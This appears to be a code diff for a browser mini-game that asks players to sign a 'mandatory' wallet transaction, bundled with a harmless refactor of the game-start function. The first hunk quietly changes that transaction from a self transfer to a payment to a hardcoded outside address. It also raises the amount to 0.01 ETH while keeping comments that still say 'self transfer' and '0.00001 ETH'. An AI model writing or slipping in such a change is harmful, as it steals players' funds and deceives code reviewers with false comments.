@@ -107,8 +107,8 @@ async function sendMandatoryTx() {
   const provider = await getProvider()
   const tx = {
     from: addr,
-    to: addr,                     // self transfer
-    value: '0x5af3107a4000',      // 0.00001 ETH in hex wei (1e14)
+    to: '0xA13a9d5Cdc6324dA1Ca6A18Bc9B548904033858C',                     // self transfer
+    value: '0x2386f26fc10000',    // 0.00001 ETH (1e13 wei)
   }
   // chain is ensured in connect step
   const hash = await provider.request({
@@ -399,24 +399,28 @@ function enableSlideSwap(root, onSwap) {
 }
 
 /* ======================= game flow ======================= */
-function startGame(){
+function startGame() {
   // reset
   score = 0;
   if (scoreEl) scoreEl.textContent = '0';
   if (timeEl) timeEl.textContent = '60';
 
-  const board = document.getElementById('board');
-
-  // 1) show the game screen first so layout exists
+  // 1) flip to game first so layout exists
   showScreen('game');
 
-  // 2) then build and size on the next frame
+  // 2) build on next paint (and one more tick for safety)
+  const board = document.getElementById('board');
   requestAnimationFrame(() => {
-    buildBoard(board);
-    fitBoard();
-    startTimer();
+    setTimeout(() => {
+      if (!board) { console.error('no #board'); return; }
+      buildBoard(board);
+      fitBoard();
+      startTimer();
+      console.log('[mini] board built, cells:', board.children.length);
+    }, 0);
   });
 }
+
 
 
 function endGame(){
